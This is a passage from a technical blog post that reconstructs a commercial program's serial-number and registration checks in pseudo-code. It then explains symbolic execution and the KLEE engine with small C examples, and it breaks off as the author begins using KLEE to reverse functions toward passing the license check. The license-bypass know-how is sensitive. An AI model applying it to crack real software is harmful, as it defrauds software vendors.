</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">expected_customer</span> <span class="o">!=</span> <span class="n">customer_num</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">INVALID</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// validate w.r.t. known registrations</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_index_in_mail_table</span><span class="p">(</span><span class="n">serial</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="n">HEADER_SIZE</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">VALID_IF_LAST_VERSION</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">mail_digest</span> <span class="o">=</span> <span class="n">compute_mail_digest</span><span class="p">(</span><span class="n">mail</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">mail_digest_table</span><span class="p">[</span><span class="n">index</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">mail_digest</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">VALID</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">INVALID</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The validation is divided in three main parts:</p>

<ul>
<li>serial number must be valid by itself;</li>
<li>serial number, combined with mail address has to correspond to the actual customer number;</li>
<li>there has to be a correspondence between serial number and mail address, stored in a static table in the binary.</li>
</ul>


<p>The last point is a little bit unusual. Let me restate it in this way: whenever a customer buys the software, the customer table gets updated with its data and become available in the <em>next</em> version of the software (because it is embedded in the binary and not downloaded trough the internet). This explains the <code>VALID_IF_LAST_VERSION</code> check: if you buy the software today, the current version does not contain your data. You are still allowed to get a &ldquo;pro&rdquo; version until a new version is released. In that moment you are forced to update to that new version, so the software can verify your registration with the updated table. Here is a pseudo-code of that check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">switch</span> <span class="p">(</span><span class="n">check_registration</span><span class="p">(</span><span class="n">serial</span><span class="p">,</span> <span class="n">customer</span><span class="p">,</span> <span class="n">mail</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'><span class="k">case</span> <span class="n">VALID</span>:
</span><span class='line'>    <span class="c1">// the registration is OK! activate functionalities</span>
</span><span class='line'>    <span class="n">activate_pro_functionality</span><span class="p">();</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="n">VALID_IF_LAST_VERSION</span>:
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="c1">// check if the current version is the last, by</span>
</span><span class='line'>        <span class="c1">// using the internet.</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">current_version</span> <span class="o">=</span> <span class="n">get_current_version</span><span class="p">();</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">last_version</span> <span class="o">=</span> <span class="n">get_last_version</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">current_version</span> <span class="o">==</span> <span class="n">last_version</span><span class="p">)</span>
</span><span class='line'>            <span class="c1">// OK for now: a new version is not available</span>
</span><span class='line'>            <span class="n">activate_pro_functionality</span><span class="p">();</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>            <span class="c1">// else, force the user to download the new version</span>
</span><span class='line'>            <span class="c1">// before proceed</span>
</span><span class='line'>            <span class="n">ask_download</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="k">case</span> <span class="n">INVALID</span>:
</span><span class='line'>    <span class="c1">// registration is not valid</span>
</span><span class='line'>    <span class="n">handle_invalid_registration</span><span class="p">();</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The version check is done by making an HTTP request to a specific page that returns a page having only the last version number of the software. Don&rsquo;t ask me why the protection is not completely server side but involves static tables, version checks and things like that. I don&rsquo;t know!</p>

<p>Anyway, this is the big picture of the registration validation functions, and this is pretty boring. Let&rsquo;s move on to the interesting part. You may notice that I provided code for the main procedure, but not for the helper functions like <code>get_license_type</code>, <code>compute_customer_number</code>, and so on. This is because I did not have to reverse them. They contain a lot of arithmetical and logical operations on registration data, and they are very difficult to understand. The good news is that we do not have to understand them, we need only to reverse them!</p>

<h2>Symbolic execution</h2>

<p>Symbolic execution is a way to execute programs using symbolic variables instead of concrete values. A symbolic variable is used whenever a value can be controlled by user input (this can be done by hand or determined by using taint analysis), and could be a file, standard input, a network stream, etc. Symbolic execution translates the program&rsquo;s semantics into a logical formula. Each instruction cause that formula to be updated. By solving a formula for one path, we get concrete values for the variables. If those values are used in the program, the execution reaches that program point. Dynamic Symbolic Execution (DSE) builds the logical formula at runtime, step-by-step, following one path at a time. When a branch of the program is found during the execution, the engine transforms the condition into arithmetic operations. It then chooses the T (true) or F (false) branch and updates the formula with this new constraint (or its negation). At the end of a path, the engine can backtrack and select another path to execute. For example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">SymVar_1</span><span class="p">,</span> <span class="n">v2</span> <span class="o">=</span> <span class="n">SymVar_2</span><span class="p">;</span> <span class="c1">// symbolic variables</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">v2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>   <span class="n">error</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>We want to check if <code>error</code> is reachable, by using symbolic variables <code>SymVar_1</code> and <code>SymVar_2</code>, assigned to the program&rsquo;s variables <code>v1</code> and <code>v2</code>. In line 2 we have the condition <code>v1 &gt; 0</code> and so, the symbolic engine adds a constraint <code>SymVar_1 &gt; 0</code> for the <em>true branch</em> or conversely <code>SymVar_1 &lt;= 0</code> for the <em>false branch</em>. It then continues the execution trying with the first constraint. Whenever a new path condition is reached, new constraints are added to the symbolic state, until that condition is no more satisfiable. In that case, the engine backtracks and replaces some constraints with their negation, in order to reach other code paths. The execution engine tries to cover all code paths, by solving those constraints and their negations. For each portion of the code reached, the symbolic engine outputs a test case covering that part of the program, providing concrete values for the input variables. In the particular example given, the engine continues the execution, and finds the condition <code>v2 == 0 &amp;&amp; v1 &lt;= 0</code> at line 4. The path formula becomes so: <code>SymVar_1 &gt; 0 &amp;&amp; (SymVar_2 == 0 &amp;&amp; SymVar_1 &lt;= 0)</code>, that is not satisfiable. The symbolic engine provides then values for the variables that satisfies the previous formula (<code>SymVar_1 &gt; 0</code>). For example <code>SymVar_1 = 1</code> and some random value for <code>SymVar_2</code>. The engine then backtrack to the previous branch and uses the negation of the constraint, that is <code>SymVar_1 &lt;= 0</code>. It then adds the negation of the current constraint to cover the false branch, obtaining <code>SymVar_1 &lt;= 0 &amp;&amp; (SymVar_2 != 0 || SymVar_1 &gt; 0)</code>. This is satisfiable with <code>SymVar_1 = -1</code> and <code>SymVar_2 = 0</code>. This concludes the analysis of the program paths, and our symbolic execution engine can output the following test cases:</p>

<ul>
<li><code>v1 = 1</code>;</li>
<li><code>v1 = -1</code>, <code>v2 = 0</code>.</li>
</ul>


<p>Those test cases are enough to cover all the paths of the program.</p>

<p>This approach is useful for testing because it helps generating test cases. It is often effective, and it does not waste computational power of your brain. You know&hellip; tests are very difficult to do effectively, and brain power is such a scarce resource!</p>

<p>I don&rsquo;t want to elaborate too much on this topic because it is way too big to fit in this post. Moreover, we are not going to use symbolic execution engines for testing purpose. This is just because we don&rsquo;t like to use things in the way they are intended :)</p>

<p>However, I will point you to some good references in the last section. Here I can list a series of common strengths and weaknesses of symbolic execution, just to give you a little bit of background:</p>

<p>Strengths:</p>

<ul>
<li>when a test case fails, the program is proven to be incorrect;</li>
<li>automatic test cases catch errors that often are overlooked in manual written test cases (this is from <a href="http://www.doc.ic.ac.uk/~cristic/papers/klee-osdi-08.pdf">KLEE paper</a>);</li>
<li>when it works it&rsquo;s cool :) (and this is from <a href="https://twitter.com/__x86">Jérémy</a>);</li>
</ul>


<p>Weaknesses:</p>

<ul>
<li>when no tests fail we are not sure everything is correct, because no proof of correctness is given; static analysis can do that when it works (and often it does not!);</li>
<li>covering all the paths is not enough, because a variable can hold different values in one path and only some of them cause a bug;</li>
<li>complete coverage for non trivial programs is often impossible, due to path explosion or constraint solver timeout;</li>
<li>scaling is difficult, and execution time of the engine can suffer;</li>
<li>undefined behavior of CPU could lead to unexpected results;</li>
<li>&hellip; and maybe there are a lot more remarks to add.</li>
</ul>


<h1>KLEE</h1>

<p>KLEE is a great example of a symbolic execution engine. It operates on <a href="http://llvm.org/">LLVM</a> byte code, and it is used for software verification purposes. KLEE is capable to automatically generate test cases achieving high code coverage. KLEE is also able to find memory errors such as out of bound array accesses and many other common errors. To do that, it needs an LLVM byte code version of the program, symbolic variables and (optionally) assertions. I have also prepared a <a href="https://registry.hub.docker.com/u/mbrt/klee/">Docker image</a> with <code>clang</code> and <code>klee</code> already configured and ready to use. So, you have no excuses to not try it out! Take this example function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define FALSE 0</span>
</span><span class='line'><span class="cp">#define TRUE 1</span>
</span><span class='line'><span class="k">typedef</span> <span class="kt">int</span> <span class="n">BOOL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">BOOL</span> <span class="nf">check_arg</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span> <span class="c1">// not reachable</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is actually a silly example, I know, but let&rsquo;s pretend to verify this function with this main:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;assert.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;klee/klee.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">input</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_make_symbolic</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="s">&quot;input&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">check_arg</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In <code>main</code> we have a symbolic variable used as input for the function to be tested. We can also modify it to include an assertion:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BOOL</span> <span class="nf">check_arg</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="n">FALSE</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span> <span class="c1">// not reachable</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can now use <code>clang</code> to compile the program to the LLVM byte code and run the test generation with the <code>klee</code> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">clang</span> <span class="o">-</span><span class="n">emit</span><span class="o">-</span><span class="n">llvm</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">o</span> <span class="n">test</span><span class="p">.</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">test</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="n">klee</span> <span class="n">test</span><span class="p">.</span><span class="n">ll</span>
</span></code></pre></td></tr></table></div></figure>


<p>We get this output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">KLEE:</span> <span class="n">output</span> <span class="n">directory</span> <span class="n">is</span> <span class="s">&quot;/work/klee-out-0&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">total</span> <span class="n">instructions</span> <span class="o">=</span> <span class="mi">26</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">completed</span> <span class="n">paths</span> <span class="o">=</span> <span class="mi">2</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">generated</span> <span class="n">tests</span> <span class="o">=</span> <span class="mi">2</span>
</span></code></pre></td></tr></table></div></figure>


<p>KLEE will generate test cases for the <code>input</code> variable, trying to cover all the possible execution paths and to make the provided assertions to fail (if any given). In this case we have two execution paths and two generated test cases, covering them. Test cases are in the output directory (in this case <code>/work/klee-out-0</code>). The soft link <code>klee-last</code> is also provided for convenience, pointing to the last output directory. Inside that directory a bunch of files were created, including the two test cases named <code>test000001.ktest</code> and <code>test000002.ktest</code>. These are binary files, which can be examined with the <code>ktest-tool</code> utility. Let&rsquo;s try it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="o">--</span><span class="n">write</span><span class="o">-</span><span class="n">ints</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000001</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="n">ktest</span> <span class="n">file</span> <span class="o">:</span> <span class="err">&#39;</span><span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000001</span><span class="p">.</span><span class="n">ktest</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">args</span>       <span class="o">:</span> <span class="p">[</span><span class="err">&#39;</span><span class="n">test</span><span class="p">.</span><span class="n">ll</span><span class="err">&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">num</span> <span class="n">objects</span><span class="o">:</span> <span class="mi">1</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">name</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">input</span><span class="err">&#39;</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">size</span><span class="o">:</span> <span class="mi">4</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="mi">2147483647</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the second one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="o">--</span><span class="n">write</span><span class="o">-</span><span class="n">ints</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000002</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure>


<p>In these test files, KLEE reports the command line arguments, the symbolic objects along with their size and the value provided for the test. To cover the whole program, we need <code>input</code> variable to get a value greater than 10 and one below or equal. You can see that this is the case: in the first test case the value 2147483647 is used, covering the first branch, while 0 is provided for the second, covering the other branch.</p>

<p>So far, so good. But what if we change the function in this way?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">BOOL</span> <span class="nf">check_arg</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>    <span class="c1">// instead of &lt;=</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span><span class='line'>    <span class="n">klee_assert</span><span class="p">(</span><span class="n">FALSE</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>       <span class="c1">// now reachable</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We get this output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">klee</span> <span class="n">test</span><span class="p">.</span><span class="n">ll</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">output</span> <span class="n">directory</span> <span class="n">is</span> <span class="s">&quot;/work/klee-out-2&quot;</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">ERROR</span><span class="o">:</span> <span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">9</span><span class="o">:</span> <span class="n">ASSERTION</span> <span class="n">FAIL</span><span class="o">:</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">NOTE</span><span class="o">:</span> <span class="n">now</span> <span class="n">ignoring</span> <span class="n">this</span> <span class="n">error</span> <span class="n">at</span> <span class="n">this</span> <span class="n">location</span>
</span><span class='line'>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">total</span> <span class="n">instructions</span> <span class="o">=</span> <span class="mi">27</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">completed</span> <span class="n">paths</span> <span class="o">=</span> <span class="mi">3</span>
</span><span class='line'><span class="nl">KLEE:</span> <span class="n">done</span><span class="o">:</span> <span class="n">generated</span> <span class="n">tests</span> <span class="o">=</span> <span class="mi">3</span>
</span></code></pre></td></tr></table></div></figure>


<p>And this is the <code>klee-last</code> directory contents:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">ls</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span>
</span><span class='line'><span class="n">assembly</span><span class="p">.</span><span class="n">ll</span>   <span class="n">run</span><span class="p">.</span><span class="n">istats</span>        <span class="n">test000002</span><span class="p">.</span><span class="n">assert</span><span class="p">.</span><span class="n">err</span>  <span class="n">test000003</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="n">info</span>          <span class="n">run</span><span class="p">.</span><span class="n">stats</span>         <span class="n">test000002</span><span class="p">.</span><span class="n">ktest</span>       <span class="n">warnings</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">messages</span><span class="p">.</span><span class="n">txt</span>  <span class="n">test000001</span><span class="p">.</span><span class="n">ktest</span>  <span class="n">test000002</span><span class="p">.</span><span class="n">pc</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note the <code>test000002.assert.err</code> file. If we examine its corresponding test file, we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">ktest</span><span class="o">-</span><span class="n">tool</span> <span class="o">--</span><span class="n">write</span><span class="o">-</span><span class="n">ints</span> <span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000002</span><span class="p">.</span><span class="n">ktest</span>
</span><span class='line'><span class="n">ktest</span> <span class="n">file</span> <span class="o">:</span> <span class="err">&#39;</span><span class="n">klee</span><span class="o">-</span><span class="n">last</span><span class="o">/</span><span class="n">test000002</span><span class="p">.</span><span class="n">ktest</span><span class="err">&#39;</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="n">object</span>    <span class="mi">0</span><span class="o">:</span> <span class="n">data</span><span class="o">:</span> <span class="mi">10</span>
</span></code></pre></td></tr></table></div></figure>


<p>As we had expected, the assertion fails when <code>input</code> value is 10. So, as we now have three execution paths, we also have three test cases, and the whole program gets covered. KLEE provides also the possibility to replay the tests with the real program, but we are not interested in it now. You can see a usage example in this <a href="http://klee.github.io/tutorials/testing-function/#replaying-a-test-case">KLEE tutorial</a>.</p>

<p>KLEE&rsquo;s abilities to find execution paths of an application are very good. According to the <a href="http://llvm.org/pubs/2008-12-OSDI-KLEE.html">OSDI 2008 paper</a>, KLEE has been successfully used to test all 89 stand-alone programs in GNU COREUTILS and the equivalent busybox port, finding previously undiscovered bugs, errors and inconsistencies. The achieved code coverage were more than 90% per tool. Pretty awesome!</p>

<p>But, you may ask: <a href="https://www.youtube.com/watch?v=j_T9YtA1mRQ">The question is, who cares?</a>. You will see it in a moment.</p>

<h2>KLEE to reverse a function</h2>

<p>As we have a powerful tool to find execution paths, we can use it to find the path we are interested in. As showed by the nice <a href="https://feliam.wordpress.com/2010/10/07/the-symbolic-maze/">symbolic maze</a> post of Feliam, we can use KLEE to solve a maze. The idea is simple but very powerful: flag the portion of code you interested in with a <code>klee_assert(0)</code> call, causing KLEE to highlight the test case able to reach that point. In the maze example, this is as simple as changing a <code>read</code> call with a <code>klee_make_symbolic</code> and the <code>prinft("You win!\n")</code> with the already mentioned <code>klee_assert(0)</code>. Test cases triggering this assertion are the one solving the maze!</p>

<p>For a concrete example, let&rsquo;s suppose we have this function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">magic_computation</span><span class="p">(</span><span class="kt">int</span> <span class="n">input</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="n">input</span> <span class="o">^=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">input</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And we want to know for what input we get the output 253. A main that tests this could be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">input</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">output</span> <span class="o">=</span> <span class="n">magic_computation</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">output</span> <span class="o">==</span> <span class="mi">253</span><span class="p">)</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You win!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
